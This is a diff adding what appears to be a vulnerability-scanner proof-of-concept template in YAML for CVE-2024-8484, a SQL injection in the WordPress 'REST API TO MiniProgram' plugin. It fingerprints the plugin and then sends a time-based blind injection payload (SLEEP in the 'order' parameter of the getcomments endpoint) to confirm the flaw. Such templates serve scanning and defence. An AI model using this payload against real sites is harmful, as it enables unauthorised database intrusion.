@@ -1,0 +1,21 @@
+id: poc-yaml-wordpress-plugin-rest-api-yo-miniprogram-sqli
+info:
+  name: WordPress Plugin REST API TO MiniProgram SQL注入漏洞(CVE-2024-8484)
+  severity: high
+  tags:
+  - sql-injection
+  - CVE-2024-8484
+  finger: rest_api_yo_miniprogram
+  fofa: /wp-content/plugins/rest-api-to-miniprogram
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"/wp-content/plugins/rest-api-to-miniprogram")
+- method: GET
+  path: /wp-json/watch-life-net/v1/comment/getcomments?order=DESC,(SELECT(1)FROM(SELECT(SLEEP({{.t1}})))a)--&postid=3&limit=1&page=1&page=1
+  expression: status_code == 200 && contains(body,"\"code\":\"success\"")&& contains(body,"status")
+    && duration > t1 && duration < t2
+transport: http
